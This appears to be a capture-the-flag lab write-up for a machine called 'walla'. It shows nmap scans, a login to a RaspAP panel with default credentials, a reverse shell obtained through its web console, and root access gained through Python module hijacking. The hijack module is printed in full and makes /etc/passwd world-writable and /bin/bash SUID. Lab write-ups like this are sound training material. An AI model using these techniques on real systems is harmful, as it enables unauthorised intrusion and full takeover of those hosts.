First Enumeration With nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn  <IP>`

```
# Nmap 7.93 scan initiated Fri Jan  6 08:07:43 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.79.97
Increasing send delay for 192.168.79.97 from 0 to 5 due to 214 out of 712 dropped probes since last increase.
Increasing send delay for 192.168.79.97 from 5 to 10 due to 46 out of 152 dropped probes since last increase.
Increasing send delay for 192.168.79.97 from 10 to 20 due to 14 out of 45 dropped probes since last increase.
Warning: 192.168.79.97 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.79.97
Host is up (0.16s latency).
Not shown: 39026 filtered tcp ports (no-response), 26504 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
8091/tcp open  jamlink

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jan  6 08:09:15 2023 -- 1 IP address (1 host up) scanned in 92.33 seconds
```

now we know what ports are open, let run nmap default scripts to know what services ar running on those ports.

`nmap -sC -sV -oN normal.tcp -p 23,25,22,53,8091 -Pn <IP>`

```
# Nmap 7.93 scan initiated Fri Jan  6 08:10:40 2023 as: nmap -sC -sV -oN normal.tcp -p 23,25,22,53,8091 -Pn 192.168.79.97
Nmap scan report for 192.168.79.97
Host is up (0.19s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
23/tcp   open  telnet     Linux telnetd
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  tcpwrapped
8091/tcp open  http       lighttpd 1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.53
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  6 08:11:04 2023 -- 1 IP address (1 host up) scanned in 24.49 seconds
```

Now we know what services are running on those port, first let's enumerate port 8091.

![image](https://user-images.githubusercontent.com/87468669/211068286-f4c48163-5beb-44c1-9f1c-8b2f7ff9e7fd.png)
 
it it asking us to login, let's use curl to check what's running on this websevice.

![image](https://user-images.githubusercontent.com/87468669/211068936-1583b72b-108f-4551-a5a9-f117f9b8ee73.png)

Looks like it is running a service name `RaspAP`, let's search online for default creds.

![image](https://user-images.githubusercontent.com/87468669/211069199-f02b1e3e-513d-4c4c-9bbf-4244fa454a36.png)

Found a default cred `admin:secret`

![image](https://user-images.githubusercontent.com/87468669/211069345-88932bbc-b738-4130-a6e4-a88c373bc07d.png)

Bull's eye 🤓, we logged in. let's play around.

![image](https://user-images.githubusercontent.com/87468669/211069579-be40def2-801c-4403-990e-5cfe6878ebe6.png)

Found a web console that excutes commands, guess that's our way in, let's get a reverse shell. 

![image](https://user-images.githubusercontent.com/87468669/211069906-8cb6c95b-ea8e-4feb-8ac9-9537df762b90.png)

ncat listener ready👀...

![image](https://user-images.githubusercontent.com/87468669/211070134-1adc8ba4-2bb6-4bd0-a58d-fa5634a55ec7.png)

reverse shell payload sent.

![image](https://user-images.githubusercontent.com/87468669/211070307-d8a506aa-a9f7-40d0-a4b5-7cd09f866dc2.png)

And we got a reverse shell. let's escalate privs.

```
www-data@walla:/var/www/html/includes$ sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
www-data@walla:/var/www/html/includes$
```

I checked for suid, there was not any, so i did `sudo -l` and so the commands we can run as root without passowrd.

![image](https://user-images.githubusercontent.com/87468669/211071666-b71d424e-66a0-4aa1-85ce-1a28127ee507.png)

running th command `sudo /usr/bin/python /home/walter/wifi_reset.py` got an error stating a module is not found, let's create a malicious python module named wificontroller.py... this vuln is called python module hijacking.

```
import os
 
def stop(text,value):
        os.system("chmod 777 /etc/passwd");
 
def reset(text,value):
        os.system("chmod +s /bin/bash");
 
def start(text,value):
        os.system("chmod +s /bin/python");
```

crafted a malicious python module, saved it as wificontroller.py. What this code those is to create an suid binary so we can abuse and get root or write to the /etc/passwd file.

![image](https://user-images.githubusercontent.com/87468669/211074260-3f6329b4-9576-450b-b380-cfbc0e837b1c.png)

ran the command again, and we have multiple ways to root. but i'm choosing the bash suid.

![image](https://user-images.githubusercontent.com/87468669/211074596-9f29528c-0694-49fd-abef-a368ce9337cc.png)

We got root!!!🤠


